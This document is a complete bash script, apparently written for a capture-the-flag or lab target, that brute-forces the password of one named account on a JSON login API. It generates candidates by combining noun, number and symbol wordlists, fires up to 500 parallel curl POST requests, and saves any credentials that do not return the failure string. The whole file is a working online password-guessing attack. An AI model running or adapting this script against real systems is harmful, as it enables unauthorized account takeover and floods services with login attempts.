#!/usr/bin/env bash
#Name: bruteforce.sh

#==========================================================
# Target Parameters
#==========================================================
HOST=target
PORT=13401
DEST=v1/auth/login
TARGET=http://${HOST}:${PORT}/${DEST}

#==========================================================
# Password Generation Parameters
#==========================================================
DICT1="words/nouns.txt"
DICT2="words/nums.txt"
DICT3="words/syms.txt"
GENERATOR=/usr/bin/combinator3
GEN_CMD="${GENERATOR} ${DICT1} ${DICT2} ${DICT3}"

#==========================================================
# Multithreading Parameter
#==========================================================
MAX_JOBS=500

#==========================================================
# HTTP Request Parameters
#==========================================================
USERNAME='guard.hopkins@hopsecasylum.com'
QUERY_PREFIX='{"username": "'"${USERNAME}"'", "password": "'
QUERY_SUFFIX='"}'
HEADER_FLAGS=(-H 'Content-Type: application/json')
FAIL_STRING='"error":"bad credentials"'

#==========================================================
# Where to Save Operational Files
#==========================================================
SUCCESS_FILE=success.txt
LOG_FILE=log.txt

rm -f ${SUCCESS_FILE} ${LOG_FILE}

#==========================================================
# Main Loop
#==========================================================
i=0
JOB_COUNTER=0
$GEN_CMD | while IFS= read -r CANDIDATE; do
# Pass each line of output from GEN_CMD into CANDIDATE

    # Run curl request in the background (non-blocking)
    (
        QUERY="${QUERY_PREFIX}${CANDIDATE}${QUERY_SUFFIX}"
        RESPONSE="$(curl -s -X POST ${HEADER_FLAGS[@]} -d "${QUERY}" "${TARGET}")";

        # Triggers exit condition on success
        if ! echo ${RESPONSE} | grep -q "${FAIL_STRING}"; then
            echo "Username: ${USERNAME}"  | tee    ${SUCCESS_FILE}
            echo "Password: ${CANDIDATE}" | tee -a ${SUCCESS_FILE}
            break;
        fi

        # Logging
        echo -e "curl -s -X POST ${HEADER_FLAGS[@]} -d '${QUERY}' ${TARGET}\n${RESPONSE}\n" >> log.txt
    ) &

    # Limit the number of parallel jobs
    JOB_COUNTER=$((JOB_COUNTER + 1))
    i=$((i+1))
    echo -ne "\rTried ${i} passwords..."

    # Block until some jobs in our batch have finished
    if [ "${JOB_COUNTER}" -ge "${MAX_JOBS}" ]; then
        wait -n
        JOB_COUNTER=$(jobs -r | wc -l)
    fi

    # Exit condition
    if [ -f ${SUCCESS_FILE} ]; then break; fi
done

#==========================================================
# Output Final Result
#==========================================================
wait
sleep 1
if [ -f ${SUCCESS_FILE} ]; then
    echo -e "\nSUCCESS!"
    cat ${SUCCESS_FILE}
else
    echo -e "\nFailed to find any passwords using list"
fi
